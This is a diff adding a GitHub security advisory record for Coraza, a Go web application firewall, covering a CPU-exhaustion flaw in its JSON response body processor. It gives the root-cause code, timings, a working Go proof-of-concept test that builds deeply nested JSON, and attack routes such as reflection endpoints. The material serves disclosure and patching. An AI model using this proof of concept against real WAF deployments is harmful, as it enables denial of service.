@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-3c6w-j9xm-8h2h",
+  "modified": "2026-10-08T18:00:08.895780210Z",
+  "published": "2026-10-08T17:51:42Z",
+  "summary": "Coraza: Unbounded recursion in JSON response body processor causes CPU exhaustion",
+  "details": "### Summary\n\nThe JSON response body processor parses response bodies with no recursion\nlimit. `ProcessResponse` calls `readJSON(ss, ignoreJSONRecursionLimit)`, and\nthat constant is `-1`. The guard in `readItems` only fires on `== 0`, so\ncounting down from `-1` (-2, -3, ...) never reaches it. The guard is effectively\ndead on the response path. The request path is fine: `ProcessRequest` passes the\nconfigured limit (default 1024). There is no equivalent directive or default for\nresponses.\n\nParsing a deeply nested JSON response is CPU-bound and its cost grows\nquadratically with nesting depth. A 512 KiB response (the default\n`ResponseBodyLimit`) holds about 87,000 nesting levels and takes ~12 s to\nprocess, keeping one core busy the whole time.\n\n### Root cause\n\n`internal/bodyprocessors/json.go`\n\n```go\nconst ignoreJSONRecursionLimit = -1                     // line 51\n\nfunc (js *jsonBodyProcessor) ProcessResponse(reader io.Reader, v ..., _ plugintypes.BodyProcessorOptions) error {\n    ...\n    data, err := readJSON(ss, ignoreJSONRecursionLimit) // line 62, passes -1\n}\n\nfunc (js *jsonBodyProcessor) ProcessRequest(...) error {\n    ...\n    data, err := readJSON(ss, bpo.RequestBodyRecursionLimit) // line 32, default 1024\n}\n```\n\nThe guard and the decrement:\n\n```go\nfunc readItems(json gjson.Result, objKey []byte, maxRecursion int, res map[string]string) error {\n    if maxRecursion == 0 {                              // line 106\n        return errors.New(\"max recursion reached while reading json object\")\n    }\n    ...\n    iterationError = readItems(value, objKey, maxRecursion-1, res) // line 126\n```\n\nNote that `ProcessResponse` discards `BodyProcessorOptions` (the parameter is\n`_`), so even a caller that wanted to set a limit on responses has no way to.\n\n### Why the cost is quadratic\n\nEvery nesting level re-parses the remaining nested document through\n`gjson.ForEach`, so total work is O(n²) in the depth. Numbers below were measured\non an Intel Core Ultra 7 255H, Go 1.22.2, gjson v1.18.0, at commit db9850b2\n(v3.7.0-55):\n\n```\ndepth   bytes    ProcessResponse time\n5000    30004    30 ms\n10000   60004    119 ms\n20000   120004   456 ms\n40000   240004   2.18 s\n87381   524290   12.09 s\n```\n\nLog-log slope between adjacent rows lands between 1.93 and 2.26 (2.09 across the\nfull range), which matches quadratic. Roughly 87,000 levels is the most that\nfits inside the default 512 KiB `ResponseBodyLimit`.\n\n### PoC\n\nSave as `internal/bodyprocessors/poc_json_test.go`, then:\n\n```\ngo test -v -timeout 120s -run TestPoCJSONResponse ./internal/bodyprocessors/...\n```\n\n```go\npackage bodyprocessors_test\n\nimport (\n      \"strings\"\n      \"testing\"\n      \"time\"\n\n      \"github.com/corazawaf/coraza/v3/experimental/plugins/plugintypes\"\n      \"github.com/corazawaf/coraza/v3/internal/bodyprocessors\"\n      \"github.com/corazawaf/coraza/v3/internal/corazawaf\"\n)\n\nfunc nestedJSON(depth int) string {\n      var sb strings.Builder\n      sb.Grow(depth*6 + 4)\n      for i := 0; i \u003c depth; i++ {\n              sb.WriteString(`{\"a\":`)\n      }\n      sb.WriteString(\"null\")\n      for i := 0; i \u003c depth; i++ {\n              sb.WriteByte('}')\n      }\n      return sb.String()\n}\n\nfunc TestPoCJSONResponse(t *testing.T) {\n      proc, _ := bodyprocessors.GetBodyProcessor(\"json\")\n\n      // Request path is bounded, response path is not.\n      body := nestedJSON(5000)\n      v := corazawaf.NewTransactionVariables()\n      errReq := proc.ProcessRequest(strings.NewReader(body), v,\n              plugintypes.BodyProcessorOptions{RequestBodyRecursionLimit: 1024})\n      errRes := proc.ProcessResponse(strings.NewReader(body), v,\n              plugintypes.BodyProcessorOptions{})\n      t.Logf(\"depth=5000 ProcessRequest  err=%v\", errReq)\n      t.Logf(\"depth=5000 ProcessResponse err=%v\", errRes)\n\n      // Quadratic scaling on the response path.\n      for _, depth := range []int{5000, 10000, 20000, 40000, 87381} {\n              b := nestedJSON(depth)\n              vv := corazawaf.NewTransactionVariables()\n              start := time.Now()\n              proc.ProcessResponse(strings.NewReader(b), vv,\n                      plugintypes.BodyProcessorOptions{})\n              t.Logf(\"depth=%-6d bytes=%-7d time=%v\", depth, len(b), time.Since(start))\n      }\n}\n```\n\nOutput on the reference machine:\n\n```\ndepth=5000 ProcessRequest  err=max recursion reached while reading json object\ndepth=5000 ProcessResponse err=\u003cnil\u003e\ndepth=5000   bytes=30004   time=30.3ms\ndepth=10000  bytes=60004   time=119.3ms\ndepth=20000  bytes=120004  time=456.1ms\ndepth=40000  bytes=240004  time=2.185s\ndepth=87381  bytes=524290  time=12.085s\n```\n\n### Impact\n\nThis needs `ResponseBodyAccess` turned on and a backend that returns JSON\n(`application/json`). Reflection endpoints, download APIs that serve\nuser-supplied content, and JSON error responses that echo back user input are\nall plausible ways to route a nested body back through the WAF.\n\nThe work happens in a single goroutine and is CPU-bound: the body is already in\nmemory, so there is no I/O during the parse. Each such request holds one core\nfor its entire run, about 12 s per 512 KiB body at the default limit. N\nconcurrent requests take N cores. The request path has enforced a recursion\nlimit since v3.3.3; responses never have.\n\n### Suggested fix\n\nBound `ProcessResponse` the same way the request path is bounded: add a\n`ResponseBodyRecursionLimit` directive, or just pass `RequestBodyRecursionLimit`\ninstead of `-1`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/corazawaf/coraza/v3",
+        "purl": "pkg:golang/github.com/corazawaf/coraza/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.8.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-3c6w-j9xm-8h2h/GHSA-3c6w-j9xm-8h2h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/security/advisories/GHSA-3c6w-j9xm-8h2h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/commit/cae3c7407e7b84372c207033de03f15f89bf351a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/corazawaf/coraza"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/releases/tag/v3.8.0"
+    }
+  ]
+}
